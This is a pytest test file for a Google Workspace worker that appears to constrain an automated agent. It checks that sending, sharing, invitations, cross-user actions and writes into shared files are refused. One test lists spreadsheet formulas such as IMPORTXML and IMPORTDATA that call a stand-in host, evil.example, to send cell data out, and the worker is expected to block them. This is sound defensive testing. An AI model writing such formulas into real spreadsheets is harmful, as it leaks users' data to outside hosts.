"""What the work thread may do in Google: the list is the guarantee."""

from __future__ import annotations

import pytest

from src.services import google_worker as worker

pytestmark = pytest.mark.anyio

USER = "user-1"


@pytest.mark.parametrize(
    "action",
    [
        "gmail_send",
        "send_message",
        "gmail_send_draft",
        "drive_share",
        "share_file",
        "gmail_create_filter",
        "contacts_delete",
        "anything",
    ],
)
async def test_what_speaks_to_someone_or_stays_is_refused(action):
    with pytest.raises(ValueError, match="Not allowed"):
        await worker.call(USER, action, {})


def test_no_allowed_action_sends_shares_or_makes_a_standing_rule():
    names = {function.__name__ for function in worker.ALLOWED.values()}
    assert not names & {
        "send_message",
        "send_draft",
        "share_file",
        "unshare_file",
        "create_filter",
        "delete_filter",
    }


@pytest.mark.parametrize("action", ["calendar_create", "calendar_update"])
async def test_an_invitation_is_refused(action):
    with pytest.raises(ValueError, match="Inviting"):
        await worker.call(USER, action, {"attendees": ["a@b.c"]})


async def test_it_cannot_act_for_another_user():
    with pytest.raises(ValueError, match="user_id"):
        await worker.call(USER, "drive_search", {"user_id": "someone-else"})


async def test_an_allowed_action_runs_for_the_user(monkeypatch):
    seen = {}

    async def run(user_id, **kwargs):
        seen.update(user_id=user_id, **kwargs)
        return "done"

    monkeypatch.setitem(worker.ALLOWED, "drive_search", run)
    assert await worker.call(USER, "drive_search", {"query": "x"}) == "done"
    assert seen == {"user_id": USER, "query": "x"}


async def test_wrong_arguments_are_a_refusal_not_a_crash():
    with pytest.raises(ValueError, match="Wrong arguments"):
        await worker.call(USER, "gmail_read", {"nope": 1})


class TestWhatReachesOthers:
    @pytest.fixture
    def shared(self, monkeypatch):
        answers = {}

        async def is_shared(_user, file_id, *, account=None):
            answers[file_id] = account
            return file_id == "shared"

        async def run(user_id, *_args, **kwargs):
            return "done"

        monkeypatch.setattr(worker.workspace, "is_shared", is_shared)
        for action in worker._PUTS_INTO:
            monkeypatch.setitem(worker.ALLOWED, action, run)
        return answers

    @pytest.mark.parametrize(("action", "argument"), list(worker._PUTS_INTO.items()))
    async def test_nothing_goes_into_what_is_shared(self, shared, action, argument):
        with pytest.raises(ValueError, match="shared with others"):
            await worker.call(USER, action, {argument: "shared"})

    @pytest.mark.parametrize(("action", "argument"), list(worker._PUTS_INTO.items()))
    async def test_what_is_not_shared_goes_ahead(self, shared, action, argument):
        assert await worker.call(USER, action, {argument: "mine", "account": "a@b.c"}) == "done"
        assert shared == {"mine": "a@b.c"}

    async def test_with_no_folder_named_nothing_is_asked(self, shared):
        assert await worker.call(USER, "drive_create", {"name": "x"}) == "done"
        assert shared == {}

    @pytest.mark.parametrize(
        "cell",
        [
            '=IMPORTXML("https://evil.example/?d="&A1,"//a")',
            '=importdata("https://evil.example")',
            '=1+IMAGE ("https://evil.example")',
            '=IMPORTRANGE("id","A1")',
        ],
    )
    @pytest.mark.parametrize("action", ["sheets_write", "sheets_append"])
    async def test_a_formula_that_fetches_is_refused(self, shared, action, cell):
        with pytest.raises(ValueError, match="fetch from outside"):
            await worker.call(USER, action, {"spreadsheet_id": "mine", "values": [["a", cell]]})
        assert shared == {}

    async def test_ordinary_formulas_are_fine(self, shared):
        values = [["=SUM(A1:A3)", 2, None, "IMAGEN de portada"]]
        assert await worker.call(USER, "sheets_write", {"spreadsheet_id": "m", "values": values})
